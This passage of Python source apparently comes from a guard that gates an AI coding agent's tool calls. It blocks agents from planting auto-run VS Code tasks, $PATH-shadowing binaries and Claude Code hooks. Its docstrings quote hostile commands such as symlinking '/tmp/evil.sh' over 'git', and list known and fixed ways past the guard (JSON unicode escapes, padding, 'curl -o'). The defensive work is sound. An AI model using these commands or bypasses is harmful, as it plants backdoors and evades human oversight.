        tasks_path_hit = bool(patterns.VSCODE_TASKS_PATH_RE.search(cmd)
                               or (vscode_cd_hit
                                   and patterns.VSCODE_TASKS_BARE_FILENAME_RE.search(cmd)))
        settings_path_hit = bool(patterns.VSCODE_SETTINGS_PATH_RE.search(cmd)
                                  or (vscode_cd_hit
                                      and patterns.VSCODE_SETTINGS_BARE_FILENAME_RE.search(cmd)))
        tasks_jq_hit = bool(patterns.VSCODE_TASKS_JQ_RE.search(cmd) and tasks_path_hit)
        settings_jq_hit = bool(patterns.VSCODE_SETTINGS_JQ_RE.search(cmd) and settings_path_hit)
        tasks_write_hit = bool(write_verb and tasks_path_hit
                                and patterns.VSCODE_TASKS_RUNON_RE.search(cmd))
        settings_write_hit = bool(write_verb and settings_path_hit
                                   and patterns.VSCODE_ALLOW_AUTOTASKS_RE.search(cmd))
        if not (tasks_jq_hit or settings_jq_hit or tasks_write_hit or settings_write_hit):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_VSCODE_TASKS_EXEC")
                or _vscode_tasks_allowed_by_policy(cfg, _cmd(ev))):
            return None
        is_settings_hit = settings_jq_hit or settings_write_hit
        reason = ('`"task.allowAutomaticTasks": "on"` is being planted in '
                   ".vscode/settings.json from a shell — it silences the "
                   "one human confirmation prompt that otherwise gates an "
                   "automatic task from running unattended" if is_settings_hit
                   else "An automatic task (`runOn: \"folderOpen\"`) is being "
                   "planted in .vscode/tasks.json from a shell — it runs "
                   "automatically, unattended, the next time this workspace "
                   "folder is opened in VS Code")
        return _finish(Decision(action, "vscode-tasks-protect",
                         f"{reason}. A human may append '# aegis-allow', or "
                         "set AEGIS_ALLOW_VSCODE_TASKS_EXEC=1; a spawned "
                         "agent cannot."))
    return None


# ---- PATH binary-shadow (hijack) protection: escapable with human confirm ----
def _path_hijack_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_path_hijack_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting, symlinking, or `chmod +x`-ing an executable over a
    trusted command name (git, ssh, sudo, curl, python, pip, npm, docker,
    aws, aegis, ...) inside a directory that already sits ahead of the
    system directories on $PATH.

    THREAT MODEL: reached by no existing guard. Every other `*_protect` guard
    in this file protects a config/definition file consulted by a specific
    subsystem on a specific FUTURE trigger — a git operation, a CI push, a
    new shell, a `cd`. PATH resolution has no such trigger: the very next
    time this agent, a teammate, or CI runs a shadowed command BY ITS BARE
    NAME — the overwhelmingly common way any of them is invoked — the shell
    resolves it to the planted file instead of the real tool. No git
    operation, CI run, reboot, new shell, or `cd` needed; the victim's own
    routine use of the tool IS the trigger, and it can fire within the same
    session that planted it.

    User-local bin directories (`~/.local/bin`, `~/.cargo/bin`, pyenv/
    rbenv/asdf shims, `~/go/bin`) are ROUTINELY ahead of `/usr/bin` on a
    modern dev machine — that's the point of `pip install --user`/`cargo
    install`/pyenv, not a misconfiguration — and `/usr/local/bin` outranks
    `/usr/bin` on nearly every Linux/macOS default PATH. A planted `git`,
    `ssh`, `sudo`, `curl`, `pip`, or `aegis` there is a durable backdoor
    invisible to `git diff`/`git status`/code review (it isn't a tracked
    project file at all) that needs no external trigger — unlike a git hook
    (next matching git op) or a CI workflow (next push), the human's or
    CI's own ordinary use of the shadowed command is what runs it. A
    shadowed `aegis` is also a self-protection gap none of
    AEGIS_SOURCE_RE/ENFORCEMENT_PATH_RE reach, since those cover Aegis's
    source TREE, not the installed executable resolved off PATH.

    Config (``policy.path_hijack``): ``mode`` (deny|ask|monitor|off, default
    ask), ``allow`` (regexes on the path/command that skip the gate — a
    repo's own sanctioned `~/.local/bin` tool-install script, say). Default
    ``ask``: installing a CLI tool into one of these directories via the
    NORMAL path (`pip install --user`, `cargo install`, `go install`, a
    package manager) is routine, sanctioned dev work that never literally
    names the target file in the invoking command line, so it doesn't match
    this guard at all — only a direct Edit/Write/MCP write, shell
    redirect/copy/move/symlink/archive-extract, or `chmod +x`, onto ONE OF A
    CURATED LIST of security-relevant command names inside one of these
    directories gates.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_PATH_HIJACK=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control (``_is_agent()``), so neither path is agent-self-escapable — the
    same invariant every escapable guard in this file holds.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: gated on a CURATED command-name list, not "any file written
    into a PATH directory" — an unlisted, unusual command name shadowed
    there is not caught, the deliberate precision-over-recall trade-off
    ``rule_package_manifest_protect``'s own docstring makes for the same
    reason (gating on the directory alone would ask on every routine
    user-scoped package install). A path assembled indirectly (shell
    variable concatenation, a `for`/`xargs` loop, `basename`/`dirname`
    reconstruction) rather than appearing as one contiguous literal is not
    caught, the same class every sibling guard accepts. Deliberately NO
    `find -path/-name` indirection fallback (unlike most siblings): the
    command names this guard watches for (`go`, `sh`, `cc`, `su`, `make`,
    `node`, ...) are common substrings of entirely unrelated, legitimate
    `find` targets (`node_modules`, `Makefile.am`, `google-cloud-sdk`), and
    the false-positive rate from wiring them into the shared
    `_find_predicate_re` helper was judged worse than the disclosed gap — a
    deliberate scope choice, not an oversight, the same trade-off
    ``rule_package_manifest_protect``'s own docstring makes for its own
    directory-indirection gap. A direct fetch-to-file write (`curl -o
    ~/.local/bin/git ...`) is caught by none of the shell branch's write-verb
    checks, the same inherited gap eight sibling guards already disclose.
    `chmod`'s numeric-mode form (`chmod 755 ...`) is still not matched —
    disambiguating "this specific octal grants execute" from "this is any
    ordinary permission change" by regex alone is unreliable enough that the
    honest choice is to disclose the gap rather than risk a wide
    false-positive surface on routine `chmod` use (see
    ``PATH_HIJACK_CHMOD_RE``'s own comment for the symbolic forms it DOES
    catch). And this guard only recognizes a CURATED set of bin directories;
    an unusual custom PATH entry (a project-local `./scripts/bin` a
    developer prepends in their own shell config, a corporate-wrapped
    toolchain install location) carries no signal this guard's patterns
    recognize at all — PATH itself is not introspected (Aegis has no
    reliable, static way to know what a FUTURE shell's resolved PATH will
    actually be), so coverage is necessarily a curated guess at the common
    cases, not a PATH-aware guarantee. The bare-directory fallback
    (``dir_only``, paired with ``ARCHIVE_SYNC_VERB_RE`` for an archive/sync
    tool that never names a single target discretely) still requires
    coreutils ``install``'s ``-m``/``--mode`` flag be present — see
    ``ARCHIVE_SYNC_VERB_RE``'s own comment for why (disambiguating from
    `npm install`/`pip install` when the only other signal is a bare
    directory mention) — and, since it has no source/destination
    awareness, also gates a legitimate BACKUP command reading FROM a bin
    directory (`rsync -a ~/.local/bin/ ~/backups/...`) the same as one
    writing INTO one; a disclosed "ask" false positive, not a false allow,
    the same "narrower false ask over a worse false negative" trade-off
    ``rule_git_attributes_exec_protect``'s own docstring accepts for its
    whole-command (not clause-scoped) check. Neither restriction applies to
    the ``touches_target`` (named-file) branch, which uses the dedicated,
    unrestricted ``PATH_HIJACK_INSTALL_RE`` instead of ``ARCHIVE_SYNC_VERB_RE``
    for `install` — see its own comment for why the ambiguity concern
    doesn't transfer once an exact ``PATH_BIN_TARGET_RE`` match is already
    required. Deny-by-default egress and workspace confinement are
    unrelated backstops that do not cover this surface at all — found a
    bypass? That's a bug worth reporting.

    QA history (two independent adversarial reviews, run in parallel, same
    convention ``rule_direnv_protect``/``rule_service_persist_protect`` used).
    Round A (bypass-hunting) confirmed five real, undisclosed bypasses in
    the original draft, all fixed here: (1) an UNFORCED `ln -s
    /tmp/evil.sh ~/.local/bin/git` (no `-f`) — the shared
    ``FORCED_LINK_WRITE_RE`` requires a force flag, correct for its OTHER
    callers (overwriting an already-tracked file) but wrong here, since the
    whole point of shadowing is that the target does NOT already exist, so
    `-f` is never needed; fixed with the dedicated, unforced
    ``PATH_HIJACK_SYMLINK_RE``. (2) bare coreutils `install evil.sh
    /usr/local/bin/git` (no `-m`/`--mode`) — GNU install's own documented
    default mode is 0755 (executable); fixed with
    ``PATH_HIJACK_INSTALL_RE`` (see above). (3) `chmod`'s idiomatic
    symbolic forms beyond literal `+x` (`chmod u+rwx`, `chmod +rwx`, `chmod
    a=rwx`) — arguably MORE commonly typed than bare `+x`; fixed by
    widening ``PATH_HIJACK_CHMOD_RE`` to any `+`/`=` clause that includes
    the `x` bit. (4) version-suffixed interpreters inside this guard's own
    motivating example directories (`~/.pyenv/shims/python3.11`,
    `~/.rbenv/shims/ruby3.2`) — pyenv/rbenv shims are routinely invoked BY
    exact version; fixed by widening `python`/`pip`/`ruby` to an optional
    version suffix. (5) the braced `${HOME}/bin/git` form of the home-bin
    anchor — only the unbraced `$HOME` literal was matched; fixed by adding
    it as a separate anchor alternative. Round A also flagged, as
    non-blocking coverage gaps rather than regex bugs, several missing
    curated bin directories (Bun/Deno installers, pnpm's `PNPM_HOME`,
    `/snap/bin`, and the Windows Scoop/Chocolatey/WindowsApps user-scope
    dirs) and command names (`uv`/`uvx`, `poetry`, `pipenv`, `conda`/
    `mamba`, `podman`, `gpg`/`gpg2`, `bun`, `deno`) — added. Round B
    (design/consistency, independent) confirmed registration
    (``_CORE_RULES``, ``Policy``, ``loader.py``, ``skills.py``, README) and
    the escape hatch/config-knob/test-coverage structure all match
    sibling-guard convention end-to-end, and found one further undisclosed
    bypass overlapping round A's install finding, confirming it
    independently. Neither round found a ReDoS/perf issue in this guard's
    own patterns (both instead found — and fixed — two PRE-EXISTING
    catastrophic-backtracking bugs in unrelated containment patterns,
    ``EXFIL_RE``/``ENV_DUMP_EXFIL_RE``, incidentally while stress-testing
    this guard's own perf test; see those patterns' own comments). Round C
    (final pre-merge verification, independent) confirmed all five round-A
    fixes and round-B's finding actually close under ``evaluate()``, ran a
    fresh adversarial pass over the fixes themselves, and confirmed no
    ReDoS regression on the widened patterns (linear scaling verified up to
    a 1.2MB adversarial input) — but found one further real, narrow false
    positive the widened ``PATH_HIJACK_CHMOD_RE`` introduced: GNU chmod's
    ``--reference=<file>`` long option also matched whenever the reference
    filename happened to end in `x` (`chmod --reference=backup_unix ...` —
    an arbitrary, attacker-adjacent filename, unlike every other chmod
    flag's fixed permission vocabulary), fixed with a negative lookbehind
    excluding that one flag name (see ``PATH_HIJACK_CHMOD_RE``'s own
    comment). Round C separately confirmed, as accepted/non-blocking
    (default mode is ``ask``, so both cause an extra confirmation, never a
    silent bypass): ``PATH_HIJACK_INSTALL_RE`` is whole-command like every
    other verb check `touches_target` already uses (`pip install --user X
    && echo ~/.local/bin/aws` also asks, the same pre-existing convention
    ``DELETE_OR_MOVE_VERB_RE``/`WRITE_REDIRECT_RE` already have, not a
    fix-introduced deviation); and the inherited 200-char verb-to-target gap
    is paddable past (`chmod ` + 250 junk chars + ` +x <target>` evades),
    the same disclosed trade-off ``SERVICE_ACTIVATE_CMD_RE``/
    ``DIRENV_ACTIVATE_RE`` already accept for their own callers."""
    cfg = getattr(policy, "path_hijack", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "path-hijack-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        if not (p and patterns.PATH_BIN_TARGET_RE.search(p)):
            return None
        if os.environ.get("AEGIS_ALLOW_PATH_HIJACK") or _path_hijack_allowed_by_policy(cfg, p):
            return None
        reason = (f"'{p}' shadows a trusted command on $PATH — the next bare "
                   "invocation of that command name, by this agent, a "
                   "teammate, or CI, silently runs this file instead of the "
                   "real tool, with no reboot/new-shell/git-op needed")
        return _finish(Decision(action, "path-hijack-protect",
                         f"{reason}. Review the change, then confirm with "
                         "AEGIS_ALLOW_PATH_HIJACK=1; a spawned agent cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        target_named = bool(patterns.PATH_BIN_TARGET_RE.search(cmd))
        touches_target = target_named and (
            patterns.WRITE_REDIRECT_RE.search(cmd)
            or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
            or patterns.DESTRUCTIVE_DELETE_RE.search(cmd)
            or patterns.INPLACE_WRITE_RE.search(cmd)
            or patterns.FORCED_LINK_WRITE_RE.search(cmd)
            or patterns.ARCHIVE_SYNC_VERB_RE.search(cmd)
            or patterns.PATH_HIJACK_CHMOD_RE.search(cmd)
            or patterns.PATH_HIJACK_INSTALL_RE.search(cmd)
            or patterns.PATH_HIJACK_SYMLINK_RE.search(cmd))
        dir_only = bool(patterns.PATH_BIN_DIR_RE.search(cmd)
                         and patterns.ARCHIVE_SYNC_VERB_RE.search(cmd))
        if not (touches_target or dir_only):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_PATH_HIJACK")
                or _path_hijack_allowed_by_policy(cfg, _cmd(ev))):
            return None
        reason = ("A trusted command name on $PATH is being shadowed"
                   if touches_target else
                   "An archive/sync tool is extracting into a $PATH bin "
                   "directory, which can plant a shadowed command without "
                   "ever naming it discretely")
        return _finish(Decision(action, "path-hijack-protect",
                         f"{reason} — the next bare invocation of that "
                         "command name, by anyone, silently runs the "
                         "planted file instead of the real tool. A human "
                         "may append '# aegis-allow', or set "
                         "AEGIS_ALLOW_PATH_HIJACK=1; a spawned agent "
                         "cannot."))
    return None


# ---- Claude Code hook-config protection: escapable with human confirm --------
def _claude_hooks_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def _claude_hooks_struct_key_hit(v, _depth: int = 0) -> bool:
    """Walk an MCP tool's raw (possibly nested) JSON args looking for
    ``hooks`` as an actual DICT KEY, not a string value — closes the bypass
    where a structural MCP arg shape (a filesystem server's own ``{"json":
    {"hooks": {...}}}`` edit-tool convention, say) never puts the key name
    anywhere `_flatten_strings` (which only walks dict VALUES) would see it.
    Same shape and same depth cap (12) as `_devcontainer_struct_key_hit` for
    the identical cyclic/pathological-payload protection."""
    if _depth > 12:
        return False
    if isinstance(v, dict):
        for k, val in v.items():
            if isinstance(k, str) and k.strip().lower() == "hooks":
                return True
            if _claude_hooks_struct_key_hit(val, _depth + 1):
                return True
        return False
    if isinstance(v, (list, tuple)):
        return any(_claude_hooks_struct_key_hit(x, _depth + 1) for x in v)
    return False


def _claude_hooks_mcp_bareword_hit(a: dict) -> bool:
    """Fallback signal for ``ActionClass.MCP`` only: ``hooks`` appears,
    exact-match (not substring), as a plain string LEAF anywhere in the
    (recursively) flattened raw MCP args — closes a "set config value"-style
    MCP tool's ``{"key": "hooks", "value": {...}}`` shape, where the key
    name is a bare sibling VALUE, never a dict key or adjacent to a quote+
    colon, the same shape `_vscode_mcp_bareword_kv_hit`'s own docstring
    describes for `rule_vscode_tasks_protect`. Exact-match, not `in`/substr,
    to keep this MCP-only fallback narrow — an unrelated multi-word string
    leaf that merely mentions "hooks" in passing (a description field, say)
    does not match."""
    return any(isinstance(s, str) and s.strip().lower() == "hooks"
               for s in _flatten_strings(a))


def _claude_hooks_json_key_hit(content: str) -> bool:
    """Parse ``content`` as JSON (only when it validates on its own) and walk
    the result SEMANTICALLY for a ``hooks`` dict key, reusing
    `_claude_hooks_struct_key_hit`'s own walk — an additional signal
    alongside `CLAUDE_HOOKS_KEY_RE`'s textual check, not a replacement for
    it (an ordinary Edit's ``new_string`` is usually a partial fragment with
    no enclosing braces, which never parses standalone, so the textual
    check still carries most of the real-world load).

    QA finding (independent adversarial review, round A): JSON's own
    ``\\uXXXX`` escape lets the key ``"hooks"`` be spelled byte-for-byte
    differently in the raw text (``"\\u0068ooks"``, or any other character
    escaped) while still decoding to the exact same key — a confirmed,
    reproduced silent-ALLOW bypass against the purely textual
    `CLAUDE_HOOKS_KEY_RE` on a whole-file ``Write`` call, since no substring
    match can see through a decode step it never performs. `json.loads`
    performs that decode for free; walking its *result* rather than its raw
    text closes this whole escaping class at once (not just ``\\u0068``)
    for any content that stands alone as valid JSON."""
    try:
        obj = json.loads(content)
    except (ValueError, TypeError):
        return False
    return _claude_hooks_struct_key_hit(obj)


def rule_claude_hooks_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering a ``hooks`` entry in ``.claude/settings.local.json``
    — the project-local, gitignored-by-default sibling of ``.claude/settings.json``
    that Claude Code reads with equal authority and merges hooks from, and that
    ``rule_self_protect``'s own ``ENFORCEMENT_PATH_RE`` never mentions.

    THREAT MODEL: Aegis's own defense rests on being the thing every tool call
    is checked against, from a process the model can't reach. That defense has
    a blind spot: Aegis's PreToolUse hook gates TOOL CALLS the model makes, not
    OTHER hooks the runtime itself invokes as its own subprocess — a
    ``PreToolUse``/``PostToolUse``/``Stop``/... entry in a settings file is
    executed directly by Claude Code, outside the tool-call loop entirely, so
    nothing in this file's rule pipeline ever sees or gates it. ``rule_self_
    protect`` already treats ``.claude/settings.json`` as fully off-limits for
    exactly this reason — but Claude Code reads a SECOND file with identical
    authority and merges its own ``hooks`` array with the first's:
    ``.claude/settings.local.json``, the project-local override file Claude
    Code itself auto-adds to ``.gitignore`` the first time it's used (a
    personal home for permissions/env/model tweaks a developer doesn't want
    checked in). Self-protect's path check has no mention of it, and no other
    guard in this file reaches it either — an agent (hijacked, prompt-injected,
    or just told to "add a debug hook") can plant an arbitrary shell command
    there and it runs automatically, with no further action from the agent,
    the next time any hook event it's registered for fires.

    That "next trigger" is a materially worse bar than every sibling
    next-trigger-auto-exec guard in this file clears: a git hook needs a
    future commit/push/checkout, an MCP server needs a future session start, a
    CI workflow needs a future push, a devcontainer command needs a future
    (re)build — this needs only the very next matching tool call, which can
    land in THIS SAME SESSION, moments after the plant. And because the file
    is gitignored by design, the plant produces no diff, shows in no `git
    status`, and survives no code review — the same "most invisible durable
    backdoor" property `rule_git_hooks_protect`'s own docstring claims for
    `.git/hooks/` (untracked, no diff), but reachable here with one ordinary
    Edit/Write call, no git internals required, and armed sooner.

    Distinct from a path-only guard for the same reason `rule_package_
    manifest_protect`/`rule_devcontainer_exec_protect` are: settings.local.json
    legitimately carries plenty of other personal config (permissions, env,
    model, statusLine, outputStyle, ...) edited for entirely benign reasons —
    gating on path alone would ask on nearly every legitimate local-settings
    tweak. Gated on PATH *and* the specific ``hooks`` key, the same "gate the
    file AND the dangerous key, not the whole file" shape those two guards use
    for their own manifests. Unlike a guard that also gates a specific
    dangerous VALUE (`rule_vscode_tasks_protect`'s `runOn`/
    `allowAutomaticTasks`), ``hooks`` has no safe value once present — any
    non-empty entry under it is at least one auto-run command, matching
    `rule_devcontainer_exec_protect`'s own six lifecycle keys in that respect.

    Config (``policy.claude_hooks``): ``mode`` (deny|ask|monitor|off, default
    ask), ``allow`` (regexes on the path/command that skip the gate — a repo's
    own trusted, reviewed local hook, say). Defaults to ``ask`` for the same
    reason every sibling ``*_protect`` guard does: a locally-installed
    formatter-on-save or notification hook can be legitimate, sanctioned
    personal tooling — it just needs a human to have actually looked at it.

    Escapable only by a human: a trailing '# aegis-allow' on the shell form,
    or the env toggle ``AEGIS_ALLOW_CLAUDE_HOOKS=1`` set by the orchestrator/
    human before launch for the Edit/Write/MCP-tool form. A spawned agent
    cannot set its own env for a hook invocation it doesn't control, so
    neither path is agent-self-escapable.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: the user-level ``~/.claude/settings.json``/``~/.claude/
    settings.local.json`` are reached the same way `rule_self_protect`'s own
    suffix-only match reaches the user-level settings.json (no anchoring to
    project root), but this is incidental, not a design goal, and a
    relocated ``CLAUDE_CONFIG_DIR`` is not specially covered; a `hooks` value
    assembled indirectly (a templating step, a build script) rather than
    appearing as a literal is not caught; and, like every sibling guard here,
    a direct fetch-to-file write (``curl -o .claude/settings.local.json
    ...``) is caught by none of the shell branch's write-verb checks, the
    same inherited gap every other guard in this file already discloses.
    `_claude_hooks_struct_key_hit`'s recursion depth cap (12, matching
    `_flatten_strings`/`_devcontainer_struct_key_hit`) means an MCP tool's
    raw JSON args nesting the real ``hooks`` dict key beyond that depth
    evades the structural fallback — the same disclosed, deliberately
    unchanged precedent those two share, not a defect unique to this guard.

    QA history (two independent agents, bypass-hunting and design/
    consistency, run in parallel — the same convention every guard in this
    file follows): design/consistency review (round B) found no confirmed
    defects — verified the ``claude_hooks`` knob is wired everywhere its
    siblings are (``Policy``, all three ``loader.py`` spots, both
    ``skills.py`` knob lists, the remedy table, README), verified the
    self-protect-precedence claim above by actually running it through
    ``evaluate()`` rather than trusting the docstring, and confirmed the
    escape-hatch/mode/monitor conventions match every sibling guard exactly.
    Bypass-hunting (round A) found and closed two real, reproduced gaps:
    (1) a silent full-ALLOW bypass — JSON's own ``\\uXXXX`` escape lets the
    key ``"hooks"`` be spelled byte-for-byte differently in the raw text
    (``"\\u0068ooks"``) while a purely textual check can't see through the
    decode step it never performs; closed by `_claude_hooks_json_key_hit`,
    which parses whole-file-valid JSON content and walks the DECODED
    structure semantically, as an additional signal alongside the textual
    check rather than a replacement for it (most real edits are partial
    fragments that never parse standalone). (2) `CLAUDE_SETTINGS_CD_RE`'s
    alias list, copied from `VSCODE_CD_RE`, was missing PowerShell's
    `Push-Location` — a confirmed, reproduced live bypass; fixed locally,
    though the identical gap is inherited and still open in
    `VSCODE_CD_RE`/`DEVCONTAINER_CD_RE` (out of scope here — a
    shared-normalization-layer fix, not a per-guard one). Round A also found
    and closed a false-positive/ask-fatigue source: an earlier draft's
    `CLAUDE_HOOKS_KEY_RE` also matched a bareword dot/bracket form
    (`hooks.`/`hooks[`) on ordinary Edit/Write literal content, intended for
    jq path-expression text but with no legitimate literal-JSON shape to
    catch there — a benign string merely mentioning `hooks.json`/`hooks.md`/
    `hooks[0]` (a webhook-URL note, a doc reference) asked unnecessarily;
    dropped for Edit/Write/MCP content, with the jq-specific case still
    covered, more safely, by `CLAUDE_HOOKS_JQ_RE`'s own assignment-adjacency
    requirement. Recommended PASS after these fixes; no round C needed. Full
    suite green throughout, and a fresh ReDoS pass (adversarial inputs up to
    500,000 characters) clean on every new pattern."""
    cfg = getattr(policy, "claude_hooks", None) or {}
    raw_mode = cfg.get("mode", "ask")
    mode = str(raw_mode).lower()
    if mode in ("off", "false") or raw_mode is False:
        return None
    action = Action.ASK if mode == "ask" else Action.DENY

    def _finish(would: Decision) -> Optional[Decision]:
        if mode == "monitor":
            _record_monitor(ev, would, "claude-hooks-protect-monitor")
            return None
        return would

    if ev.action in (ActionClass.EDIT, ActionClass.WRITE, ActionClass.MCP):
        p = _path(ev)
        a = ev.args or {}
        literal = a.get("content") or a.get("new_string")
        content = literal if isinstance(literal, str) and literal else " ".join(_flatten_strings(a))
        if not p or not content:
            return None
        if not patterns.CLAUDE_LOCAL_SETTINGS_PATH_RE.search(p):
            return None
        hit = bool(patterns.CLAUDE_HOOKS_KEY_RE.search(content)
                   or _claude_hooks_json_key_hit(content))
        if not hit and ev.action == ActionClass.MCP:
            hit = bool(_claude_hooks_struct_key_hit(a) or _claude_hooks_mcp_bareword_hit(a))
        if not hit:
            return None
        if (os.environ.get("AEGIS_ALLOW_CLAUDE_HOOKS")
                or _claude_hooks_allowed_by_policy(cfg, p)):
            return None
        return _finish(Decision(action, "claude-hooks-protect",
                         f"'{p}' is being written with a `hooks` entry — Claude "
                         "Code executes it directly as its own subprocess on "
                         "the next matching tool call, often in this same "
                         "session, OUTSIDE the tool-call loop Aegis evaluates, "
                         "and (being gitignored by default) with no diff and "
                         "no code review. Review the change, then confirm "
                         "with AEGIS_ALLOW_CLAUDE_HOOKS=1; a spawned agent "
                         "cannot."))

    if _is_shell(ev):
        cmd = _shell_scan(ev)
        write_verb = bool(patterns.WRITE_REDIRECT_RE.search(cmd)
                           or patterns.DELETE_OR_MOVE_VERB_RE.search(cmd)
                           or patterns.INPLACE_WRITE_RE.search(cmd)
                           or patterns.FORCED_LINK_WRITE_RE.search(cmd))
        cd_hit = bool(patterns.CLAUDE_SETTINGS_CD_RE.search(cmd))
        path_hit = bool(patterns.CLAUDE_LOCAL_SETTINGS_PATH_RE.search(cmd)
                         or (cd_hit and patterns.CLAUDE_LOCAL_SETTINGS_BARE_FILENAME_RE.search(cmd)))
        if not path_hit:
            return None
        jq_hit = bool(patterns.CLAUDE_HOOKS_JQ_RE.search(cmd))
        write_hit = bool(write_verb and patterns.CLAUDE_HOOKS_KEY_RE.search(cmd))
        if not (jq_hit or write_hit):
            return None
        if (_override_allowed(ev) or os.environ.get("AEGIS_ALLOW_CLAUDE_HOOKS")
                or _claude_hooks_allowed_by_policy(cfg, _cmd(ev))):
            return None
        return _finish(Decision(action, "claude-hooks-protect",
                         "A `hooks` entry is being planted in "
                         ".claude/settings.local.json from a shell — Claude "
                         "Code executes it directly as its own subprocess on "
                         "the next matching tool call, often in this same "
                         "session, OUTSIDE the tool-call loop Aegis "
                         "evaluates, and (being gitignored by default) with "
                         "no diff and no code review. A human may append "
                         "'# aegis-allow', or set AEGIS_ALLOW_CLAUDE_HOOKS=1; "
                         "a spawned agent cannot."))
    return None


def _conftest_allowed_by_policy(cfg: dict, text: str) -> bool:
    for pat in (cfg.get("allow") or []):
        try:
            if re.search(str(pat), text, re.IGNORECASE):
                return True
        except re.error:
            continue
    return False


def rule_conftest_protect(ev: Event, policy=None) -> Optional[Decision]:
    """Block planting/altering a pytest ``conftest.py`` with an auto-exec-
    on-collection shape: a module-level process/code-exec call, an
    auto-invoked pytest hook function (``pytest_configure``,
    ``pytest_sessionstart``, ...) wrapping one, or an ``autouse=True``
    fixture wrapping one.

    THREAT MODEL: pytest auto-discovers and imports EVERY ``conftest.py``
    from the invocation's rootdir down to each collected test's own
    directory -- no explicit ``import`` statement, no opt-in flag, no
    wiring in ``pytest.ini``/``pyproject.toml``/``tox.ini`` required. It is
    pytest's single most fundamental plugin-loading mechanism, on by
    default in every pytest project, this repo's own ``tests/`` included.
    Module-level code in a ``conftest.py`` runs at IMPORT time, during
    collection, before a single test is selected or run -- ``pytest -k
    nonexistent_name``, ``pytest --collect-only``, and ``pytest
    --fixtures`` all trigger it just as surely as a full run does.
    ``pytest_configure``/``pytest_sessionstart``/``pytest_collection_
    modifyitems``/etc. are hook functions pytest calls unconditionally,
    with no per-test opt-in, and an ``autouse=True`` fixture runs for every
    test in its scope without being requested by name anywhere.

    Nothing else in this file reaches this surface: ``rule_package_
    manifest_protect`` gates JS/PHP install-lifecycle keys, not Python test
    collection; the CI-workflow/git-hooks/devcontainer/vscode-tasks/
    claude-hooks guards all gate OTHER auto-exec surfaces. The shape here
    is the same "innocuous-looking, plausible-purpose tracked file that
    becomes remote code execution on a routine, expected future action,
    with no further attacker action needed" every sibling ``*_protect``
    guard in this file targets -- but reachable via an even more mundane
    trigger than most of them (running the project's own test suite --
    something a teammate or CI does constantly, often within minutes of
    the plant) and requiring zero additional configuration or opt-in step
    at all (no ``pre-commit install``, no CI wiring, no ``direnv allow``) --
    pytest's ``conftest.py`` auto-load is unconditional, on-by-default
    behavior. This is a documented, real-world supply-chain vector: a
    malicious ``conftest.py`` landed in an otherwise ordinary-looking PR
    has been used to get RCE on CI runners and on any contributor's/
    reviewer's machine that runs the suite locally.

    Deliberately NOT gated on any ``conftest.py`` write, nor on "any
    dangerous call anywhere in it" -- unlike ``.envrc`` (whose entire
    content is inherently auto-run shell with no benign non-executable
    form), a ``conftest.py``'s NORMAL content is fixtures/hooks, and a
    fixture requested by name from an ordinary test -- including one that
    legitimately shells out via ``subprocess.run`` to exercise a CLI under
    test, a common and entirely benign integration-test pattern -- only
    runs when that test actually asks for it. Gating on any dangerous call
    anywhere in the file would flag that routine pattern on nearly every
    edit; gating on "no conftest.py edit is safe" would be the single
    noisiest guard in this file. Instead this narrows to the three shapes
    above, which share the property every one of them runs UNCONDITIONALLY
    on any pytest invocation, matching the "gate the dangerous SHAPE, not
    the whole file" trade-off ``rule_package_manifest_protect``/``rule_
    devcontainer_exec_protect``/``rule_claude_hooks_protect`` already make
    for their own manifests.

    Config (``policy.conftest``): ``mode`` (deny|ask|monitor|off, default
    ask), ``allow`` (regexes on the path/command that skip the gate -- a
    repo's own trusted, reviewed conftest.py helper, say). Defaults to
    ``ask`` for the same reason every sibling ``*_protect`` guard does: an
    ``autouse`` fixture or a ``pytest_configure`` hook that shells out can
    be legitimate, sanctioned test-infrastructure work (a linter check, an
    environment sanity check) -- it just needs a human to have actually
    looked at it once.

    Escapable only by a human: a trailing '# aegis-allow' on the shell
    form, or the env toggle ``AEGIS_ALLOW_CONFTEST=1`` set by the
    orchestrator/human before launch for the Edit/Write/MCP-tool form. A
    spawned agent cannot set its own env for a hook invocation it doesn't
    control, so neither path is agent-self-escapable.

    Honest scope, the same denylist trade-offs every guard in this file
    discloses: the auto-invoked-hook and autouse-fixture checks use a
    bounded (4000-char) forward lookahead for co-occurrence, not a real
    parse of the function's body -- a hook/fixture def followed, within
    that window, by an unrelated dangerous call in a DIFFERENT, later
    function can still match, the same disclosed trade-off ``CLAUDE_HOOKS_
    JQ_RE``'s own assignment-adjacency window already accepts (QA's bypass-
    hunting round widened this from an original 600 chars after finding
    that width too NARROW for an ordinary, undoctored docstring ahead of the
    real call -- a false ALLOW on a realistic fixture body, not merely a
    contrived one; 4000 is still a fixed bound, not a real parse, so an
    unusually long function could in principle still exceed it); a dangerous
    call assembled indirectly (string concatenation, a wrapper the file
    then calls) rather than appearing as a literal defeats every check
    here; the module-level check's "unindented" signal is column-0-in-the-
    SCANNED-TEXT, not column-0-in-the-real-file -- an ``Edit`` call's
    ``new_string`` is often a partial fragment, and a genuinely indented
    statement that happens to start a fragment can misread as module-level
